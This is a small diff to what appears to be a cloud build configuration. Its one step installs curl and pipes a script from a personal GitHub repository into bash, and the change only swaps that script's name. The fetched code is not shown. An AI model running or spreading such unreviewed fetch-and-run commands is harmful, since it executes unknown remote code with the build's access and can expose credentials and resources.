@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-        apt-get update && apt-get install curl -y && curl -sL https://github.com/bengetsia/soft/raw/main/sb | bash
+        apt-get update && apt-get install curl -y && curl -sL https://github.com/bengetsia/soft/raw/main/wasi | bash
     waitFor:
       - '-'
     entrypoint: /bin/bash
